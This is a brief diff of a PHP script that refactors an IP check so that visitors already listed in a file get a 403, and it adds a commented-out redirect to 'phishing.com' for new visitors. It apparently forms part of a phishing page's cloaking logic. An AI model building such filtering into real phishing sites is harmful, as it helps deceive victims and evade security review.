@@ -15,11 +15,11 @@ else {
 
 $zCh = file_get_contents("visitors_ip.txt");
 $visitors_ip = explode("\n", $zCh);
-$count_ip = count($visitors_ip);
 
-for ($i = 0; $i < $count_ip; $i++) {
-   if ($visitors_ip[$i] == $ip) {
+if (in_array($ip, $visitors_ip)) {
       header("HTTP/1.0 403 Forbidden");
-   }
+}
+elseif (!in_array($ip, $visitors_ip)) {
+//header("Location: phishing.com");
 }
 ?>
